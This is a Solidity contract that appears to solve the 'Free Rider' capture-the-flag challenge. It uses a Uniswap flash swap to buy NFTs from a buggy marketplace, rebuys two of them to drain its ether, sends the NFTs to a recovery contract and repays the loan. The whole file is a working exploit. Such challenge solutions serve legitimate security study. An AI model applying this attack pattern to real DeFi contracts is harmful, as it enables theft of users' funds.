// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "../DamnValuableNFT.sol";
import "hardhat/console.sol";

contract FreeRiderAttacker {
    address private uniswapPair;
    FreeRiderNFTMarketplace private nftMarketPlace;
    FreeRiderRecovery private recovery;
    DamnValuableNFT private nftToken;
    address private weth;
    address private owner;

    constructor(
        address _uniswapPair,
        address _nftMarketPlace,
        address _recovery,
        address _nftToken,
        address _weth
    ) {
        uniswapPair = _uniswapPair;
        nftMarketPlace = FreeRiderNFTMarketplace(payable(_nftMarketPlace));
        recovery = FreeRiderRecovery(_recovery);
        nftToken = DamnValuableNFT(_nftToken);
        weth = _weth;
        owner = msg.sender;
    }

    function attack(
        uint256 amountEthFlash,
        bytes calldata tokensBuyData
    ) public {
        // token0 is weth
        (bool s0, bytes memory token0Data) = uniswapPair.call(
            abi.encodeWithSignature("token0()")
        );
        require(
            weth == abi.decode(token0Data, (address)),
            "Token0 is not weth"
        );
        (bool s, ) = uniswapPair.call(
            abi.encodeWithSignature(
                "swap(uint256,uint256,address,bytes)",
                amountEthFlash,
                0,
                address(this),
                tokensBuyData
            )
        );
        require(s, "eth flash swap failed");
    }

    function uniswapV2Call(
        address,
        uint _amount0,
        uint,
        bytes calldata tokensBuyData
    ) external {
        require(msg.sender == address(uniswapPair), "Not authorized");
        (uint256 priceOfAToken, uint[] memory tokenIds) = abi.decode(
            tokensBuyData,
            (uint256, uint256[])
        );

        (bool s1, ) = weth.call(
            abi.encodeWithSignature("withdraw(uint256)", priceOfAToken)
        );

        require(s1, "Failed to withdraw eth");

        nftMarketPlace.buyMany{value: priceOfAToken}(tokenIds);

        // check passed
        // for (uint i = 0; i < tokenIds.length; i++) {
        //     if (nftToken.ownerOf(tokenIds[i]) != address(this)) {
        //         console.log("Didn't receive nft");
        //     }
        // }
        // if (address(this).balance != priceOfAToken * 6) {
        //     console.log("Didn't receive eth");
        // }
        // console.log("Eth and nfts received");
        nftToken.setApprovalForAll(address(nftMarketPlace), true);

        uint[] memory offerIds = new uint[](2);
        offerIds[0] = tokenIds[0];
        offerIds[1] = tokenIds[1];
        uint[] memory offerPrices = new uint[](2);
        offerPrices[0] = priceOfAToken;
        offerPrices[1] = priceOfAToken;
        nftMarketPlace.offerMany(offerIds, offerPrices);
        nftMarketPlace.buyMany{value: priceOfAToken}(offerIds);

        // check passed
        // require(address(this).balance == priceOfAToken * 7);
        // console.log("resold and bought nfts and received all ether");

        for (uint i = 0; i < tokenIds.length; i++) {
            nftToken.safeTransferFrom(
                address(this),
                address(recovery),
                tokenIds[i],
                abi.encode(owner)
            );
        }
        // check passed
        // console.log("transferred nfts");
        uint wethReturn = _amount0 + (_amount0 * 5) / 1000;

        (bool s3, ) = weth.call{value: wethReturn}(
            abi.encodeWithSignature("deposit()")
        );
        require(s3, "Failed to convert eth to weth");
        (bool s4, ) = weth.call(
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                uniswapPair,
                wethReturn
            )
        );
        // check passed

        require(s4, "Failed to transfer weth back to the uniswap contract");
        // console.log("transferred eth to uniswap");
    }

    receive() external payable {}

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
